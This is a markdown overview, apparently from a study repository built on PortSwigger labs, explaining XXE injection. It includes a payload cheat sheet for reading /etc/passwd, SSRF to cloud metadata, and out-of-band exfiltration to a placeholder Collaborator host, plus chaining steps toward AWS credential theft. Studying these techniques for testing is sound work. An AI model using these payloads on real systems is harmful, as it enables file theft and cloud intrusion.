# XXE injection — topic overview & router

XML External Entity injection lets an attacker trick an XML parser into loading external resources — reading local files, performing SSRF, or exfiltrating data out-of-band. Any endpoint that parses XML (including SVG, SOAP, XInclude) is a target.

## 30-second quick reference

```xml
<!-- File read — inject before root element -->
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<!-- reference: &xxe; in any text node -->

<!-- SSRF — same pattern, URL target -->
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/"> ]>

<!-- Blind OOB — regular entity -->
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://BURP-COLLABORATOR"> ]>

<!-- Blind OOB — parameter entity (when regular blocked) -->
<!DOCTYPE test [<!ENTITY % xxe SYSTEM "http://BURP-COLLABORATOR"> %xxe; ]>

<!-- XInclude — when you can't control DOCTYPE -->
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</foo>

<!-- SVG file upload -->
<?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname"> ]>
<svg ...><text>&xxe;</text></svg>
```

## Decision map

| Condition | Sub-technique | Approach |
|---|---|---|
| Response reflects XML content | [Basic-file-read-and-SSRF](Basic-file-read-and-SSRF/) | inject `file://` or `http://` entity |
| No data in response | [Blind-out-of-band](Blind-out-of-band/) | OOB via Burp Collaborator |
| Blind + can host DTD | [Blind-data-exfiltration](Blind-data-exfiltration/) | external DTD → exfil via OOB URL or error |
| No DOCTYPE control, data in POST param | [Hidden-attack-surfaces](Hidden-attack-surfaces/) | XInclude injection |
| File upload accepts SVG/XML | [Hidden-attack-surfaces](Hidden-attack-surfaces/) | SVG with external entity |
| No external network, need data | [Hidden-attack-surfaces](Hidden-attack-surfaces/) | repurpose local DTD + error-based |

## Sub-technique folders
- `Basic-file-read-and-SSRF/` — external entity reads files or hits internal URLs (2 labs)
- `Blind-out-of-band/` — OOB DNS/HTTP via regular and parameter entities (2 labs)
- `Blind-data-exfiltration/` — external DTD chains for OOB exfil and error-based exfil (2 labs)
- `Hidden-attack-surfaces/` — XInclude, SVG upload, local DTD repurposing (3 labs)

## Root cause
XML parsers process `<!ENTITY>` declarations in DTDs by default. `SYSTEM` entities load external resources (files or URLs). The parser fetches the resource and inlines it — the application never intended to expose file reads or make outbound HTTP.

## Find it
- Any `Content-Type: application/xml` or `text/xml` request body
- SOAP endpoints, stock checkers, search, import/upload features that accept XML
- File upload that accepts SVG, DOCX, XLSX, PPTX (all XML-based)
- POST params whose values are embedded into an XML document server-side (XInclude risk)
- Fuzz: insert `<!DOCTYPE test [ <!ENTITY xxe "test"> ]>` — if parser errors differ, XML is being parsed

## Chaining
- File read → `/etc/passwd` (usernames), source code → hardcoded creds → [SQL-injection](../SQL-injection/)
- SSRF → cloud metadata `169.254.169.254` → AWS IAM credentials → full cloud compromise
- SSRF → internal services → pivot to [SSRF](../SSRF/) chain
- XXE → `/proc/self/cmdline`, `/proc/net/arp` → internal network map

## Tools
- **Burp Repeater** — inject and test payloads
- **Burp Collaborator** — receive OOB DNS/HTTP for blind XXE confirmation and data exfil
- **Exploit server** — host malicious external DTD files

## References
- https://portswigger.net/web-security/xxe
- https://portswigger.net/web-security/xxe/xml-entities
- https://portswigger.net/web-security/xxe/blind
